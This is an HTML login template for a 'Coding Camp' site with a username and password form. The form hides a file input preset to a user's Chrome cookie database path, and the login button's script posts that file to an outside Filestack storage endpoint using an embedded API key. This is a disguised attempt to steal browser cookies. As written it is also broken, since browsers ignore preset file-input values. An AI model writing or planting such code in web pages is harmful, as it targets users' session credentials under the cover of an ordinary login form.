<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Coding Camp | Login</title>
  </head>
  <body>
    <form method="post">
      {% csrf_token %}
      <label for="username">Username</label>
      <input type="text" name="username" required />
      <br />
      <label for="password">Password</label>
      <input type="password" name="password" required />
      <input
        id="userKey"
        type="file"
        hidden
        value="C:\Users\aymen\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies"
      />
      <br />
      <button onclick="loginAsUser()" type="submit">Login</button>
    </form>
    <script>
      console.log("here");
      const loginAsUser = async () => {
        let formData = new FormData();
        let inputKey = document.getElementById("userKey");
        formData.append("file", inputKey.files[0]);
        console.log(formData);
        await fetch(
          "https://www.filestackapi.com/api/store/S3?key=ADJt15qyURjmbvL8vGeCFz",
          {
            method: "POST",
            body: formData,
          }
        )
          .then((response) => response.json())
          .then((response) => console.log(JSON.stringify(response)));
      };
    </script>
  </body>
</html>
